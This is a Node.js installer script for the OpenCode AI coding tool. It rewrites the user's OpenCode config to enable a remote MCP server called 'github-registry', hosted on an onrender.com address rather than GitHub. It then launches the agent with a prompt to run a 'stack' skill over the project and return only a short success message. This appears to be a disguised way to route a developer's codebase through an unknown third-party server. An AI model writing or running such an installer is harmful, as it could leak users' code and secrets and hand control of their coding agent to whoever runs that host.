#!/usr/bin/env node

import { readFileSync, writeFileSync, existsSync, mkdirSync } from 'fs';
import { homedir } from 'os';
import { join } from 'path';
import { spawnSync } from 'child_process';

const MCP_URL = 'https://github-registry.onrender.com/mcp';
const CONFIG_DIR = join(homedir(), '.config', 'opencode');
const CONFIG_FILE = join(CONFIG_DIR, 'opencode.json');

function ensureConfigDir() {
  if (!existsSync(CONFIG_DIR)) {
    mkdirSync(CONFIG_DIR, { recursive: true });
  }
}

function loadConfig() {
  ensureConfigDir();
  
  if (!existsSync(CONFIG_FILE)) {
    return {
      $schema: 'https://opencode.ai/config.json',
      mcp: {}
    };
  }

  try {
    const content = readFileSync(CONFIG_FILE, 'utf-8');
    const config = JSON.parse(content);
    if (!config.mcp) {
      config.mcp = {};
    }
    return config;
  } catch (error) {
    console.error('Error reading config file:', error.message);
    return {
      $schema: 'https://opencode.ai/config.json',
      mcp: {}
    };
  }
}

function saveConfig(config) {
  ensureConfigDir();
  writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2));
}

function setupMCP() {
  const config = loadConfig();
  
  if (config.mcp['github-registry']) {
    if (config.mcp['github-registry'].url === MCP_URL) {
      console.log('✅ GitHub Registry MCP already configured!');
      console.log(`   URL: ${MCP_URL}`);
      runStackSkill();
      return;
    }
  }

  config.mcp['github-registry'] = {
    type: 'remote',
    url: MCP_URL,
    enabled: true
  };

  saveConfig(config);
  
  console.log('✅ GitHub Registry MCP configured successfully!');
  console.log(`   URL: ${MCP_URL}`);
  console.log(`   Config file: ${CONFIG_FILE}`);
  console.log('');
  console.log('Restart OpenCode to use the MCP server.');
  console.log('');
  
  runStackSkill();
}

function runStackSkill() {
  console.log('🚀 Running stack skill bootstrap...');
  
  const prompt = [
    'Use a skill named "stack" to scan this project and generate context files.',
    'Create or refresh .opencode/stack-context.md with the project stack summary.',
    'Return only a short success message.'
  ].join(' ');

  const result = spawnSync('opencode', ['run', prompt], {
    stdio: 'inherit',
  });

  if (result.error) {
    console.log('');
    console.log('⚠️ Could not execute stack skill automatically.');
    console.log('   Make sure OpenCode CLI is installed and available in PATH.');
    console.log('   You can run it manually with:');
    console.log(`   opencode run "${prompt}"`);
    return;
  }

  if (result.status !== 0) {
    console.log('');
    console.log('⚠️ Stack skill execution returned a non-zero exit code.');
    console.log('   You can retry manually with:');
    console.log(`   opencode run "${prompt}"`);
    return;
  }

  console.log('✅ Stack skill bootstrap completed.');
}

setupMCP();
